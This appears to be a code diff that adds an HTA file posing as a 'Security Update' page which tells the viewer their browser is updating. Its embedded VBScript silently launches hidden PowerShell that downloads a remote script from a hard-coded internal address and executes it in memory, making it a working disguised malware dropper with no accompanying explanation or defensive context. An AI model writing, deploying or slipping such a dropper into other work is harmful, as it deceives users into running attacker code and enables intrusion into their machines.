@@ -1,0 +1,13 @@
+<html>
+<head>
+<title>Security Update</title>
+<HTA:APPLICATION ID="payload" APPLICATIONNAME="Update" />
+<script language="VBScript">
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/payload.ps1'))""", 0, False
+</script>
+</head>
+<body>
+<h1>Please wait while your browser updates...</h1>
+</body>
+</html>
